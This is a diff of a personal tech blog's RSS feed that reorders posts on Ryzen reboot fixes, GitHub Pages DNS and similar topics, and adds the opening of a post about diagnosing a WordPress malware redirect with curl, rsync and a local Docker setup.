@@ -4,11 +4,11 @@
     <link>https://klingt.net/articles</link>
     <description></description>
     <managingEditor> (Andreas Linz)</managingEditor>
-    <pubDate>Sun, 20 Feb 2022 09:19:11 +0000</pubDate>
+    <pubDate>Sat, 09 Apr 2022 12:38:35 +0000</pubDate>
     <item>
-      <title>GitHub Pages DNS Setup</title>
-      <link>https://klingt.net/articles/github-pages-dns-setup.html</link>
-      <description>In this article I describe the DNS setup for my GitHub Pages website which is served under the www subdomain and the apex or base domain.</description>
+      <title>AMD Ryzen random reboots under Linux when in idle</title>
+      <link>https://klingt.net/articles/amd-ryzen-random-reboots-under-linux-when-in-idle.html</link>
+      <description>This post describes how to prevent random reboots for AMD Ryzen based Linux systems in idle state that use XMP memory profiles.</description>
       <content:encoded><![CDATA[<!doctype html>
 <html lang="en">
 
@@ -16,9 +16,9 @@
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   
-  <meta name="description" content="In this article I describe the DNS setup for my GitHub Pages website which is served under the www subdomain and the apex or base domain.">
+  <meta name="description" content="This post describes how to prevent random reboots for AMD Ryzen based Linux systems in idle state that use XMP memory profiles.">
   
-  <title>GitHub Pages DNS Setup</title>
+  <title>AMD Ryzen random reboots under Linux when in idle</title>
 
   <link rel="icon" type="image/svg+xml" href='https://klingt.net/assets/logo.svg'>
   <link rel="apple-touch-icon" href='https://klingt.net/assets/logo-apple-touch-icon.png'>
@@ -43,33 +43,37 @@
     <div class="main">
       <main>
         
-<h1>GitHub Pages DNS Setup</h1>
-<p>I chose <a href="https://guides.github.com/features/pages/">GitHub Pages</a> to serve <a href="https://github.com/klingtnet/klingtnet.github.io">this website</a>.  By default a GitHub Pages website is served under <code>&lt;repo&gt;.github.io</code>, which is fine but not what I wanted.  As this is a replacement for my old website I wanted it to be served under my domain <code>klingt.net</code>.</p>
-<p>Fortunately, setting up a GitHub pages website is pretty easy.  Just create a repository and set the branch and directory which contains the website files in the repositories Pages settings.  <sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup></p>
-<p><img src="/articles/github-pages-settings-source-dialog.png" alt="GitHub Pages settings source dialog"></p>
-<p>Adding a custom domain is also straightforward and <a href="https://docs.github.com/en/pages/configuring-a-custom-domain-for-your-github-pages-site/about-custom-domains-and-github-pages#supported-custom-domains">GitHub's excellent documentation has you covered</a> as usual.  For my case I wanted to serve this website to be served under the <code>www</code> subdomain, that is <code>www.klingt.net</code>, and the apex or base domain <code>klingt.net</code>.  Configuring an apex domain requires an additional step which is why I decided to write this article.</p>
-<p>First things first, let's start with setting up the required DNS records.  For the <a href="https://docs.github.com/en/pages/configuring-a-custom-domain-for-your-github-pages-site/about-custom-domains-and-github-pages#supported-custom-domains"><code>www</code> subdomain</a> I just needed to add a <code>CNAME</code> record that points <code>www.klingt.net</code> to <code>klingtnet.github.io</code>.  I use <code>dig</code> for debugging or showing DNS records and in the following command you will see how to retrieve a <code>CNAME</code> record for a domain:</p>
-<pre><code class="language-sh">$ dig +noall +answer www.klingt.net CNAME
-www.klingt.net.         3600    IN      CNAME   klingtnet.github.io.
-</code></pre>
-<p>If you do not have a shell available, e.g. because you're reading this article from a phone or from a Windows machine &#x1f644;, you can use online tools liks <a href="https://dns-lookup.jvns.ca">https://dns-lookup.jvns.ca</a>.</p>
-<p>Setting up the <a href="https://docs.github.com/en/pages/configuring-a-custom-domain-for-your-github-pages-site/about-custom-domains-and-github-pages#using-an-apex-domain-for-your-github-pages-site">apex domain</a> is a bit more complicated because there are no <code>CNAME</code> records for this type of domain.  Instead, you can just define an <a href="https://support.dnsimple.com/articles/alias-record/"><code>ALIAS</code></a> record that—as the name suggests—alias <code>klingt.net</code> with <code>www.klingt.net</code>.  Let's do a DNS query using <code>dig</code> for the <code>ALIAS</code> record:</p>
-<pre><code class="language-sh">$ dig +noall +answer klingt.net ALIAS
-klingt.net.             929     IN      A       185.199.109.153
-klingt.net.             929     IN      A       185.199.111.153
-klingt.net.             929     IN      A       185.199.108.153
-klingt.net.             929     IN      A       185.199.110.153
-</code></pre>
-<p>You might wonder why the <code>ALIAS</code> record is not showing up in the result.  This is perfectly fine because the name server resolves an ALIAS directly into A (IPv4) or AAAA (IPv6) records.</p>
-<p>The last thing you need to do is to set the default domain under which your domain should be served, again in the Pages settings dialog of the GitHub repository:</p>
-<p><img src="/articles/github-pages-settings-domain-dialog.png" alt="GitHub Pages settings domain dialog"></p>
-<p>Doing this will create a <a href="https://github.com/klingtnet/klingtnet.github.io/blob/4bd965fa2772ccfc3c69bc5d22ed76d2b9fc65f0/static/CNAME"><code>CNAME</code> file</a> in the source branch that you've initially configured.  Make sure to pull the commit that created this file or manually add it to your website contents.</p>
-<p>Et Voilà!  Your website should now be served under your custom domain with a valid HTTPS certificate.</p>
+<h1>AMD Ryzen random reboots under Linux when in idle</h1>
+<p>At the end of 2019 I decided to replace my, now 10 years old, trusty Intel i7 920 machine.
+The main motivation was that the i7 was not powerful enough to drive a bunch of CPU hungry software synth, and I always wanted to have a machine that was able to handle any amount of audio plugins I throw at it.
+It was still fast enough for some casual gaming or web browsing so I gave it to a friend who was looking for PC at that time.  Otherwise I would have had to throw it away, which would have made me feel a little guilty.
+Anyways, AMD Ryzen was all the buzz at that time so I decided to go for that and ordered all the necessary parts.</p>
+<p>Here are the relevant specs for reference:</p>
+<ul>
+<li>CPU: AMD Ryzen 3700X</li>
+<li>Mainboard: ASUS ROG STRIX B450-I GAMING</li>
+<li>Memory: 32GB Corsair DDR4 DRAM 3200MHz (part no. <code>CMK32GX4M2B3200C16</code>) <sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup></li>
+<li>OS: Arch Linux kernel 5.14.8-arch1-1</li>
+</ul>
+<p>Now to the actual topic of this post that is the random reboots that the Ryzen PC showed when running in idle for some time.
+I ran a stress test over night and there was no spontaneous reboot so I could rule out a faulty power supply.
+Checking <code>journalctl</code> for errors did not reveal anything suspicious <sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup>, in fact the logs just ended before the reboot without any error message.</p>
+<p>There is a <a href="https://wiki.gentoo.org/wiki/Ryzen#Random_reboots_with_mce_events">Ryzen page on Gentoo's wiki</a> that recommends to set two kernel parameters:</p>
+<ul>
+<li><code>idle=nomwait</code></li>
+<li>and <code>processor.max_cstate=5</code></li>
+</ul>
+<p>The latter one disables certain processor <a href="https://www.thomas-krenn.com/en/wiki/Processor_P-states_and_C-states#C-states">c-states</a> which are basically sleep levels a processor can reach when idling, where C0 is the active state and Cn is the <em>lowest level of activity</em> or <em>power consumption</em>.  Disabling c-states is actually wasting energy and thus not very desirable.  I then set both kernel parameters and tried the latest kernel and the LTS variant, but spontaneous reboots still occured.  For a moment I ran out of ideas and suspected that either my Ryzen CPU was defective.</p>
+<p>A couple of weeks passed and after some UEFI update I had to reset BIOS settings to <em>optimized defaults</em>.  With default settings no random reboots happened anymore!  Problem solved?  Not yet.  In default settings memory is not running at full speed and Ryzen CPUs scale quite well with memory bandwidth.  Enabling the <a href="https://www.intel.com/content/www/us/en/gaming/extreme-memory-profile-xmp.html">XMP memory profile</a> is, except the a different boot order, the only thing I change from defaults.  This made me curious and after some googling I stumbled over a <a href="https://linustechtips.com/topic/1298348-ryzen-reboot-at-idle-solved-rma/">linustechtips forum thread</a> where someone suggested to disable memory <em>power down mode</em>.  Because BIOS settings are often undocumented I cannot exactly say what this settings does, except from the obviously disabling some memory power saving feature.  Anyways, this setting was located under <code>AI Tweaker -&gt; Memory Timing Controls</code> which is kind of hidden.</p>
+<p>To make a long story short, disabling memory <em>power down mode</em> made the random reboots disappear, even when if the memory XMP profile is activated.</p>
 <section class="footnotes" role="doc-endnotes">
 <hr>
 <ol>
 <li id="fn:1" role="doc-endnote">
-<p>Configuring the source branch and directory is something I always forget to do and then I'm wondering why my website does not show up &#x1f605;&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+<p>dmidecode to the rescue, god knows which RAM I had installed: <code>$ sudo dmidecode --type memory | grep -i part</code>&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:2" role="doc-endnote">
+<p><code>$ journalctl --priority 0..3 --boot=-1</code>&#160;<a href="#fnref:2" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
 </li>
 </ol>
 </section>
@@ -83,7 +87,7 @@ klingt.net.             929     IN      A       185.199.110.153
 </html>
 ]]></content:encoded>
       <author>Andreas Linz</author>
-      <pubDate>Sun, 20 Feb 2022 09:19:11 +0000</pubDate>
+      <pubDate>Sat, 09 Apr 2022 12:38:35 +0000</pubDate>
     </item>
     <item>
       <title>The simplest sorting algorithm</title>
@@ -184,7 +188,7 @@ from partially sorted inputs.</p>
 </html>
 ]]></content:encoded>
       <author>Andreas Linz</author>
-      <pubDate>Sun, 20 Feb 2022 09:19:11 +0000</pubDate>
+      <pubDate>Sat, 09 Apr 2022 12:38:35 +0000</pubDate>
     </item>
     <item>
       <title>Learning Touch Typing</title>
@@ -250,7 +254,87 @@ from partially sorted inputs.</p>
 </html>
 ]]></content:encoded>
       <author>Andreas Linz</author>
-      <pubDate>Sun, 20 Feb 2022 09:19:11 +0000</pubDate>
+      <pubDate>Sat, 09 Apr 2022 12:38:35 +0000</pubDate>
+    </item>
+    <item>
+      <title>GitHub Pages DNS Setup</title>
+      <link>https://klingt.net/articles/github-pages-dns-setup.html</link>
+      <description>In this article I describe the DNS setup for my GitHub Pages website which is served under the www subdomain and the apex or base domain.</description>
+      <content:encoded><![CDATA[<!doctype html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+  <meta name="description" content="In this article I describe the DNS setup for my GitHub Pages website which is served under the www subdomain and the apex or base domain.">
+  
+  <title>GitHub Pages DNS Setup</title>
+
+  <link rel="icon" type="image/svg+xml" href='https://klingt.net/assets/logo.svg'>
+  <link rel="apple-touch-icon" href='https://klingt.net/assets/logo-apple-touch-icon.png'>
+
+  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraCode/fira_code.css' />
+  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraGO/fira_go.css' />
+  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/base.css' />
+  
+  <link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.0.1/styles/github.min.css"
+    media="screen and (prefers-color-scheme: light)" />
+  <link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.0.1/styles/github-dark.min.css"
+    media="screen and (prefers-color-scheme: dark)" />
+  <script src="//unpkg.com/@highlightjs/cdn-assets@11.0.1/highlight.min.js"></script>
+  <script defer>
+    hljs.highlightAll();
+  </script>
+  <script type="text/javascript">new Image().src='https://nullitics.com/n.gif?u=' + encodeURI(location.href) + '&r=' + encodeURI(document.referrer) + '&d=' + screen.width;</script>
+</head>
+
+<body>
+  <div class="wrapper">
+    <div class="main">
+      <main>
+        
+<h1>GitHub Pages DNS Setup</h1>
+<p>I chose <a href="https://guides.github.com/features/pages/">GitHub Pages</a> to serve <a href="https://github.com/klingtnet/klingtnet.github.io">this website</a>.  By default a GitHub Pages website is served under <code>&lt;repo&gt;.github.io</code>, which is fine but not what I wanted.  As this is a replacement for my old website I wanted it to be served under my domain <code>klingt.net</code>.</p>
+<p>Fortunately, setting up a GitHub pages website is pretty easy.  Just create a repository and set the branch and directory which contains the website files in the repositories Pages settings.  <sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup></p>
+<p><img src="/articles/github-pages-settings-source-dialog.png" alt="GitHub Pages settings source dialog"></p>
+<p>Adding a custom domain is also straightforward and <a href="https://docs.github.com/en/pages/configuring-a-custom-domain-for-your-github-pages-site/about-custom-domains-and-github-pages#supported-custom-domains">GitHub's excellent documentation has you covered</a> as usual.  For my case I wanted to serve this website to be served under the <code>www</code> subdomain, that is <code>www.klingt.net</code>, and the apex or base domain <code>klingt.net</code>.  Configuring an apex domain requires an additional step which is why I decided to write this article.</p>
+<p>First things first, let's start with setting up the required DNS records.  For the <a href="https://docs.github.com/en/pages/configuring-a-custom-domain-for-your-github-pages-site/about-custom-domains-and-github-pages#supported-custom-domains"><code>www</code> subdomain</a> I just needed to add a <code>CNAME</code> record that points <code>www.klingt.net</code> to <code>klingtnet.github.io</code>.  I use <code>dig</code> for debugging or showing DNS records and in the following command you will see how to retrieve a <code>CNAME</code> record for a domain:</p>
+<pre><code class="language-sh">$ dig +noall +answer www.klingt.net CNAME
+www.klingt.net.         3600    IN      CNAME   klingtnet.github.io.
+</code></pre>
+<p>If you do not have a shell available, e.g. because you're reading this article from a phone or from a Windows machine &#x1f644;, you can use online tools liks <a href="https://dns-lookup.jvns.ca">https://dns-lookup.jvns.ca</a>.</p>
+<p>Setting up the <a href="https://docs.github.com/en/pages/configuring-a-custom-domain-for-your-github-pages-site/about-custom-domains-and-github-pages#using-an-apex-domain-for-your-github-pages-site">apex domain</a> is a bit more complicated because there are no <code>CNAME</code> records for this type of domain.  Instead, you can just define an <a href="https://support.dnsimple.com/articles/alias-record/"><code>ALIAS</code></a> record that—as the name suggests—alias <code>klingt.net</code> with <code>www.klingt.net</code>.  Let's do a DNS query using <code>dig</code> for the <code>ALIAS</code> record:</p>
+<pre><code class="language-sh">$ dig +noall +answer klingt.net ALIAS
+klingt.net.             929     IN      A       185.199.109.153
+klingt.net.             929     IN      A       185.199.111.153
+klingt.net.             929     IN      A       185.199.108.153
+klingt.net.             929     IN      A       185.199.110.153
+</code></pre>
+<p>You might wonder why the <code>ALIAS</code> record is not showing up in the result.  This is perfectly fine because the name server resolves an ALIAS directly into A (IPv4) or AAAA (IPv6) records.</p>
+<p>The last thing you need to do is to set the default domain under which your domain should be served, again in the Pages settings dialog of the GitHub repository:</p>
+<p><img src="/articles/github-pages-settings-domain-dialog.png" alt="GitHub Pages settings domain dialog"></p>
+<p>Doing this will create a <a href="https://github.com/klingtnet/klingtnet.github.io/blob/4bd965fa2772ccfc3c69bc5d22ed76d2b9fc65f0/static/CNAME"><code>CNAME</code> file</a> in the source branch that you've initially configured.  Make sure to pull the commit that created this file or manually add it to your website contents.</p>
+<p>Et Voilà!  Your website should now be served under your custom domain with a valid HTTPS certificate.</p>
+<section class="footnotes" role="doc-endnotes">
+<hr>
+<ol>
+<li id="fn:1" role="doc-endnote">
+<p>Configuring the source branch and directory is something I always forget to do and then I'm wondering why my website does not show up &#x1f605;&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+</ol>
+</section>
+
+
+      </main>
+    </div>
+  </div>
+</body>
+
+</html>
+]]></content:encoded>
+      <author>Andreas Linz</author>
+      <pubDate>Sat, 09 Apr 2022 12:38:35 +0000</pubDate>
     </item>
     <item>
       <title>Go Generics - A Quick Overview</title>
@@ -450,91 +534,7 @@ Instead of requiring a method on <code>T</code> let <code>AppendIfNew</code> acc
 </html>
 ]]></content:encoded>
       <author>Andreas Linz</author>
-      <pubDate>Sun, 20 Feb 2022 09:19:11 +0000</pubDate>
-    </item>
-    <item>
-      <title>AMD Ryzen random reboots under Linux when in idle</title>
-      <link>https://klingt.net/articles/amd-ryzen-random-reboots-under-linux-when-in-idle.html</link>
-      <description>This post describes how to prevent random reboots for AMD Ryzen based Linux systems in idle state that use XMP memory profiles.</description>
-      <content:encoded><![CDATA[<!doctype html>
-<html lang="en">
-
-<head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  
-  <meta name="description" content="This post describes how to prevent random reboots for AMD Ryzen based Linux systems in idle state that use XMP memory profiles.">
-  
-  <title>AMD Ryzen random reboots under Linux when in idle</title>
-
-  <link rel="icon" type="image/svg+xml" href='https://klingt.net/assets/logo.svg'>
-  <link rel="apple-touch-icon" href='https://klingt.net/assets/logo-apple-touch-icon.png'>
-
-  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraCode/fira_code.css' />
-  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraGO/fira_go.css' />
-  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/base.css' />
-  
-  <link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.0.1/styles/github.min.css"
-    media="screen and (prefers-color-scheme: light)" />
-  <link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.0.1/styles/github-dark.min.css"
-    media="screen and (prefers-color-scheme: dark)" />
-  <script src="//unpkg.com/@highlightjs/cdn-assets@11.0.1/highlight.min.js"></script>
-  <script defer>
-    hljs.highlightAll();
-  </script>
-  <script type="text/javascript">new Image().src='https://nullitics.com/n.gif?u=' + encodeURI(location.href) + '&r=' + encodeURI(document.referrer) + '&d=' + screen.width;</script>
-</head>
-
-<body>
-  <div class="wrapper">
-    <div class="main">
-      <main>
-        
-<h1>AMD Ryzen random reboots under Linux when in idle</h1>
-<p>At the end of 2019 I decided to replace my, now 10 years old, trusty Intel i7 920 machine.
-The main motivation was that the i7 was not powerful enough to drive a bunch of CPU hungry software synth, and I always wanted to have a machine that was able to handle any amount of audio plugins I throw at it.
-It was still fast enough for some casual gaming or web browsing so I gave it to a friend who was looking for PC at that time.  Otherwise I would have had to throw it away, which would have made me feel a little guilty.
-Anyways, AMD Ryzen was all the buzz at that time so I decided to go for that and ordered all the necessary parts.</p>
-<p>Here are the relevant specs for reference:</p>
-<ul>
-<li>CPU: AMD Ryzen 3700X</li>
-<li>Mainboard: ASUS ROG STRIX B450-I GAMING</li>
-<li>Memory: 32GB Corsair DDR4 DRAM 3200MHz (part no. <code>CMK32GX4M2B3200C16</code>) <sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup></li>
-<li>OS: Arch Linux kernel 5.14.8-arch1-1</li>
-</ul>
-<p>Now to the actual topic of this post that is the random reboots that the Ryzen PC showed when running in idle for some time.
-I ran a stress test over night and there was no spontaneous reboot so I could rule out a faulty power supply.
-Checking <code>journalctl</code> for errors did not reveal anything suspicious <sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup>, in fact the logs just ended before the reboot without any error message.</p>
-<p>There is a <a href="https://wiki.gentoo.org/wiki/Ryzen#Random_reboots_with_mce_events">Ryzen page on Gentoo's wiki</a> that recommends to set two kernel parameters:</p>
-<ul>
-<li><code>idle=nomwait</code></li>
-<li>and <code>processor.max_cstate=5</code></li>
-</ul>
-<p>The latter one disables certain processor <a href="https://www.thomas-krenn.com/en/wiki/Processor_P-states_and_C-states#C-states">c-states</a> which are basically sleep levels a processor can reach when idling, where C0 is the active state and Cn is the <em>lowest level of activity</em> or <em>power consumption</em>.  Disabling c-states is actually wasting energy and thus not very desirable.  I then set both kernel parameters and tried the latest kernel and the LTS variant, but spontaneous reboots still occured.  For a moment I ran out of ideas and suspected that either my Ryzen CPU was defective.</p>
-<p>A couple of weeks passed and after some UEFI update I had to reset BIOS settings to <em>optimized defaults</em>.  With default settings no random reboots happened anymore!  Problem solved?  Not yet.  In default settings memory is not running at full speed and Ryzen CPUs scale quite well with memory bandwidth.  Enabling the <a href="https://www.intel.com/content/www/us/en/gaming/extreme-memory-profile-xmp.html">XMP memory profile</a> is, except the a different boot order, the only thing I change from defaults.  This made me curious and after some googling I stumbled over a <a href="https://linustechtips.com/topic/1298348-ryzen-reboot-at-idle-solved-rma/">linustechtips forum thread</a> where someone suggested to disable memory <em>power down mode</em>.  Because BIOS settings are often undocumented I cannot exactly say what this settings does, except from the obviously disabling some memory power saving feature.  Anyways, this setting was located under <code>AI Tweaker -&gt; Memory Timing Controls</code> which is kind of hidden.</p>
-<p>To make a long story short, disabling memory <em>power down mode</em> made the random reboots disappear, even when if the memory XMP profile is activated.</p>
-<section class="footnotes" role="doc-endnotes">
-<hr>
-<ol>
-<li id="fn:1" role="doc-endnote">
-<p>dmidecode to the rescue, god knows which RAM I had installed: <code>$ sudo dmidecode --type memory | grep -i part</code>&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
-</li>
-<li id="fn:2" role="doc-endnote">
-<p><code>$ journalctl --priority 0..3 --boot=-1</code>&#160;<a href="#fnref:2" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
-</li>
-</ol>
-</section>
-
-
-      </main>
-    </div>
-  </div>
-</body>
-
-</html>
-]]></content:encoded>
-      <author>Andreas Linz</author>
-      <pubDate>Sun, 20 Feb 2022 09:19:11 +0000</pubDate>
+      <pubDate>Sat, 09 Apr 2022 12:38:35 +0000</pubDate>
     </item>
     <item>
       <title>(Almost) 30 Best Albums of 2021</title>
@@ -752,7 +752,7 @@ Checking <code>journalctl</code> for errors did not reveal anything suspicious <
 </html>
 ]]></content:encoded>
       <author>Andreas Linz</author>
-      <pubDate>Sun, 20 Feb 2022 09:19:11 +0000</pubDate>
+      <pubDate>Sat, 09 Apr 2022 12:38:35 +0000</pubDate>
     </item>
     <item>
       <title>How to delete unreachable commits on GitHub</title>
@@ -833,7 +833,7 @@ Date:   Sun Jul 25 16:18:10 2021 +0200
 </html>
 ]]></content:encoded>
       <author>Andreas Linz</author>
-      <pubDate>Sun, 20 Feb 2022 09:19:11 +0000</pubDate>
+      <pubDate>Sat, 09 Apr 2022 12:38:35 +0000</pubDate>
     </item>
     <item>
       <title>My MacBook Air M1 setup</title>
@@ -1029,7 +1029,7 @@ $ gpgconf --kill gpg-agent
 </html>
 ]]></content:encoded>
       <author>Andreas Linz</author>
-      <pubDate>Sun, 20 Feb 2022 09:19:11 +0000</pubDate>
+      <pubDate>Sat, 09 Apr 2022 12:38:35 +0000</pubDate>
     </item>
     <item>
       <title>Go 1.18 with some fuzzing and a focus on generics</title>
@@ -1229,7 +1229,436 @@ func Write(w io.Writer) error {}
 </html>
 ]]></content:encoded>
       <author>Andreas Linz</author>
-      <pubDate>Sun, 20 Feb 2022 09:19:11 +0000</pubDate>
+      <pubDate>Sat, 09 Apr 2022 12:38:35 +0000</pubDate>
+    </item>
+    <item>
+      <title>How I Detected and Removed Malware from a Wordpress Installation</title>
+      <link>https://klingt.net/articles/how-i-detected-and-removed-malware-from-a-wordpress-installation.html</link>
+      <description>Wordpress is the major target for malware, mainly because it&#39;s so widespread often unmaintained, and plugins add additional loopholes to the already fragile CMs.  Even with auto updates enabled, you Wordpress instance will not be safe from getting infected with malware.  In this article I will describe how I removed a malware from an up-to-date wordpress instance and describe what I found there.</description>
+      <content:encoded><![CDATA[<!doctype html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+  <meta name="description" content="Wordpress is the major target for malware, mainly because it&#39;s so widespread often unmaintained, and plugins add additional loopholes to the already fragile CMs.  Even with auto updates enabled, you Wordpress instance will not be safe from getting infected with malware.  In this article I will describe how I removed a malware from an up-to-date wordpress instance and describe what I found there.">
+  
+  <title>How I Detected and Removed Malware from a Wordpress Installation</title>
+
+  <link rel="icon" type="image/svg+xml" href='https://klingt.net/assets/logo.svg'>
+  <link rel="apple-touch-icon" href='https://klingt.net/assets/logo-apple-touch-icon.png'>
+
+  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraCode/fira_code.css' />
+  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraGO/fira_go.css' />
+  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/base.css' />
+  
+  <link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.0.1/styles/github.min.css"
+    media="screen and (prefers-color-scheme: light)" />
+  <link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.0.1/styles/github-dark.min.css"
+    media="screen and (prefers-color-scheme: dark)" />
+  <script src="//unpkg.com/@highlightjs/cdn-assets@11.0.1/highlight.min.js"></script>
+  <script defer>
+    hljs.highlightAll();
+  </script>
+  <script type="text/javascript">new Image().src='https://nullitics.com/n.gif?u=' + encodeURI(location.href) + '&r=' + encodeURI(document.referrer) + '&d=' + screen.width;</script>
+</head>
+
+<body>
+  <div class="wrapper">
+    <div class="main">
+      <main>
+        
+<h1>How I Detected and Removed Malware from a Wordpress Installation</h1>
+<p>This week a friend of mine reached out to me, telling me their website got &quot;hacked&quot;, and asking if I could have a look and see if I can fix it.  Of course they didn't got hacked, instead their Wordpress installation caught a malware.  The only indication I got was that those redirects started about three weeks ago.</p>
+<h2>Reproduce the Issue</h2>
+<p>First step was visiting their website with developer tools open, trying to reproduce the issue.  It didn't took me long to get redirected, I think the second link I clicked resulted in the scammer website being loaded.</p>
+<p><img src="scammer-website-family-drugs-net.png" alt="screenshot showing the scammer website family-drugs.net"></p>
+<p>Not a surprise that <code>family-drugs.net</code> accepts Bitcoin, fraud is the only use case of cryptocurrencies<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup>.  The network tab wasn't showing any suspicious requests so I copied the request as cURL statement that resulted in the redirect.  Then I ran the cURL request and, voila, the server responded with a 302 redirect.  This let me rule out malicious Javascript as the culprit, since cURL is not evaluating it.  To get a minimal example I started removing header arguments from the cURL statement until I ended up with:</p>
+<pre><code class="language-sh">$ curl -I -H 'referer: infected-website.de' https://infected-website.de/page` 
+HTTP/1.1 302 Found
+Date: Sun, 03 Apr 2022 16:37:56 GMT
+Server: Apache/2.4.53 (Debian)
+X-Powered-By: PHP/7.4.28
+Set-Cookie: sl_message=admin; expires=Thu, 01-Jan-2032 00:00:00 GMT; Max-Age=307524123; path=/
+Location: https://family-drugs.net/
+Content-Type: text/html; charset=UTF-8
+</code></pre>
+<p>Actually, it didn't matter which value the <code>referer</code> header had, it only had to be present.   Also, they set a cookie for whatever reason.</p>
+<h2>Run the Wordpress Website Locally</h2>
+<p>We're left with only three candidates that can contain the malware, Apache, Wordpress or its database.  Apache being the most unlikely of the three because the website was hosted on a professional hosting service and then a bunch of customers would have been affected as well.  Anyhow, this could easily be disqualified by running the Wordpress installation locally.  Docker compose is the obvious choice for this setup.</p>
+<p>Before I could start with the docker-compose setup I needed to get a copy of the website files and a dump of their MySQL database.  A database dump could be downloaded from the admin panel of the webhoster, it was 42373 lines of SQL and 13MiB in size.  Getting a copy of the file tree was also easy since I had SSH access.</p>
+<p>At first I tried to clone the website by using FTP, and there's a reason nobody is using this protocol anymore.  Somehow random files ended up missing in my local copy and thus Wordpress was not starting, only showing some generic error message and no log message at all 😩.  It took me more than an hour until I realized that something was missing.</p>
+<p>My rescue was <code>rsync --archive infected-website.de: ./infected-website</code>, resulting in a whopping 18210 files consuming 1.3GiB of disk space 🙈.</p>
+<p>Here's the <code>docker-compose.yml</code> I came up with:</p>
+<pre><code class="language-yaml">version: &quot;3.9&quot;
+    
+services:
+  db:
+    # Note that there's no arm64v8 (Apple Silicon) image for mysql:5.7,
+    # but for mysql/mysql-server:5.7 there is one¯\_(ツ)_/¯
+    image: mysql/mysql-server:5.7
+    restart: always
+    volumes:
+    # Import database dump.
+      - ./infected-website.sql:/docker-entrypoint-initdb.d/dump.sql:ro
+    environment:
+    # Use the credentials that are defined in wp-config.php.
+      MYSQL_DATABASE: infected-website
+      MYSQL_USER: admin
+      MYSQL_PASSWORD: this-is-a-secret
+  wordpress:
+    depends_on:
+      - db
+    image: wordpress:5.9.2
+    volumes:
+      - ./cloned-website/html:/var/www/html:ro
+    ports:
+      - &quot;80:80&quot;
+    restart: always
+</code></pre>
+<p>In this setup MySQL is not exposed on <code>localhost:3306</code>, instead it can be accessed from the wordpress container through the <code>db</code> hostname.  This means I needed to apply the following patch to <code>wp-config.php</code>:</p>
+<pre><code class="language-diff">-define('DB_HOST', 'localhost');
++define('DB_HOST', 'db');
+</code></pre>
+<p>Running the website locally was only a <code>docker-compose up</code> away.  After opening <code>localhost</code> in my browser I got redirected to <code>infected-website.de</code>.  Looks like I need to replace the domain with <code>localhost</code> in the SQL dump.  A perfect task for good ol' <code>sed</code>:</p>
+<pre><code class="language-sh">$ sed -Ei '' 's/(http:|https:)?\/\/(www\.)?infected-website\.de/http:\/\/localhost/g' usr_web629_1.sq
+</code></pre>
+<p>Please note that I'm using macOS' <code>sed</code> here, but the same command should work on Linux machines if you remove the empty quotes that follow the <code>-Ei</code> flag.</p>
+<p>Now I'm ready to run the site locally.</p>
+<h3>Investigation</h3>
+<p>I did the obvious at first and searched for occurrences of <code>family-drugs.net</code> in the website source files and the database dump.  That wasn't very fruitful so I tried different encodings of the search string, e.g. base64, hex encoded, unicode escaped and so on<sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup>.  Looking for the substring <code>drugs</code> in a variety of encodings did not help either, no hit in the search results.</p>
+<p>Next thing I tried was to deactivate all the plugins through Wordpress' dashboard.  After deactivating them I ran the cURL request again, but this time against <code>localhost</code> and got a redirect 😕.</p>
+<pre><code class="language-sh">$ curl -I -H 'referer: does-not-matter' localhost/page
+HTTP/1.1 302 Found
+Date: Sat, 09 Apr 2022 12:28:36 GMT
+Server: Apache/2.4.53 (Debian)
+X-Powered-By: PHP/7.4.28
+Set-Cookie: sl_message=admin; expires=Thu, 01-Jan-2032 00:00:00 GMT; Max-Age=307020684; path=/
+Location: https://family-drugs.net/
+Content-Type: text/html; charset=UTF-8
+</code></pre>
